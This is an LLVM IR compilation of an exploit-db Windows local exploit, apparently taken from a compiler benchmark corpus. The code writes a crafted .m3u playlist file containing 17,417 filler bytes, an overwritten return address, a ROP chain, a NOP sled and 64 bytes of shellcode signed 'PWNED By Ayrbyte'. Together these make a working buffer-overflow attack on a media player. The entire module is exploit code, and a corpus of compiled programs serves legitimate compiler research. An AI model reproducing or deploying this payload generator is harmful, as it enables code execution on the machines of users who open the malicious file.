; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19323.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19323.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.header = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@__const.main.buff = private unnamed_addr constant [2 x i8] c"A\00", align 1
@__const.main.eip = private unnamed_addr constant [5 x i8] c"\16\10\9C|\00", align 1
@__const.main.nop = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@__const.main.code = private unnamed_addr constant [64 x i8] c"\B86\C6\0D\10\B9\FF\FF\FF\0F\BA\FF\FF\FF\0F+\C1+\D1RP\90\90\90\90\90P\90\90\90\90R\90\E8\D5>\CAw PWNED By Ayrbyte...! ^_^\00", align 16
@__const.main.rop = private unnamed_addr constant [57 x i8] c"AAAAB\02\9F|\FF\FF\FF\FF\D8\85\A4|\AF\CF\A4|\A4\22\86|\CA.\AE|\CB.\AE|\FE.\AE|\CB.\AE|\01N\9E|\1D\C9\91|\8E\09\F3we\82\A5|\00", align 16
@.str = private unnamed_addr constant [15 x i8] c"c:\\Ayrbyte.m3u\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [8 x i8], align 1
  %3 = alloca [2 x i8], align 1
  %4 = alloca [5 x i8], align 1
  %5 = alloca [2 x i8], align 1
  %6 = alloca [64 x i8], align 16
  %7 = alloca [57 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %11 = bitcast [8 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([8 x i8], [8 x i8]* @__const.main.header, i32 0, i32 0), i64 8, i1 false)
  %12 = bitcast [2 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.main.buff, i32 0, i32 0), i64 2, i1 false)
  %13 = bitcast [5 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.eip, i32 0, i32 0), i64 5, i1 false)
  %14 = bitcast [2 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.main.nop, i32 0, i32 0), i64 2, i1 false)
  %15 = bitcast [64 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([64 x i8], [64 x i8]* @__const.main.code, i32 0, i32 0), i64 64, i1 false)
  %16 = bitcast [57 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([57 x i8], [57 x i8]* @__const.main.rop, i32 0, i32 0), i64 57, i1 false)
  %17 = call i32* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %17, i32** %8, align 8
  %18 = getelementptr inbounds [8 x i8], [8 x i8]* %2, i64 0, i64 0
  %19 = load i32*, i32** %8, align 8
  %20 = call i32 @fputs(i8* %18, i32* %19)
  store i32 0, i32* %9, align 4
  br label %21

21:                                               ; preds = %28, %0
  %22 = load i32, i32* %9, align 4
  %23 = icmp slt i32 %22, 17417
  br i1 %23, label %24, label %31

24:                                               ; preds = %21
  %25 = getelementptr inbounds [2 x i8], [2 x i8]* %3, i64 0, i64 0
  %26 = load i32*, i32** %8, align 8
  %27 = call i32 @fputs(i8* %25, i32* %26)
  br label %28

28:                                               ; preds = %24
  %29 = load i32, i32* %9, align 4
  %30 = add nsw i32 %29, 1
  store i32 %30, i32* %9, align 4
  br label %21

31:                                               ; preds = %21
  %32 = getelementptr inbounds [5 x i8], [5 x i8]* %4, i64 0, i64 0
  %33 = load i32*, i32** %8, align 8
  %34 = call i32 @fputs(i8* %32, i32* %33)
  %35 = getelementptr inbounds [57 x i8], [57 x i8]* %7, i64 0, i64 0
  %36 = load i32*, i32** %8, align 8
  %37 = call i32 @fputs(i8* %35, i32* %36)
  store i32 0, i32* %10, align 4
  br label %38

38:                                               ; preds = %45, %31
  %39 = load i32, i32* %10, align 4
  %40 = icmp slt i32 %39, 28
  br i1 %40, label %41, label %48

41:                                               ; preds = %38
  %42 = getelementptr inbounds [2 x i8], [2 x i8]* %5, i64 0, i64 0
  %43 = load i32*, i32** %8, align 8
  %44 = call i32 @fputs(i8* %42, i32* %43)
  br label %45

45:                                               ; preds = %41
  %46 = load i32, i32* %10, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %10, align 4
  br label %38

48:                                               ; preds = %38
  %49 = getelementptr inbounds [64 x i8], [64 x i8]* %6, i64 0, i64 0
  %50 = load i32*, i32** %8, align 8
  %51 = call i32 @fputs(i8* %49, i32* %50)
  %52 = load i32*, i32** %8, align 8
  %53 = call i32 @fclose(i32* %52)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fputs(i8*, i32*) #2

declare dso_local i32 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
